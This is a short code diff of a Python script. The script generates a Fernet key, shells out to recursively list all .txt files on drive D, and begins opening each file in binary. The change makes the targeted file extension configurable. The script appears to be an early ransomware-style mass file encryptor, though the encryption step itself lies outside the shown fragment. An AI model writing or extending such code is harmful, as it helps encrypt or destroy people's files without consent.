@@ -9,9 +9,13 @@ key = Fernet.generate_key()
 # create class with key
 key2 = Fernet(key)
 
+desired_format="txt"
+
+
 #get files list
-fille = check_output("D: && dir /S /B *txt",shell=True).decode().split()
+fille = check_output(f"D: && dir /S /B *{desired_format}",shell=True).decode().split()
 #write key in txt
+
 
 for fileasli in fille:
     dirlist = open(fileasli,"rb")#rb = ready binary
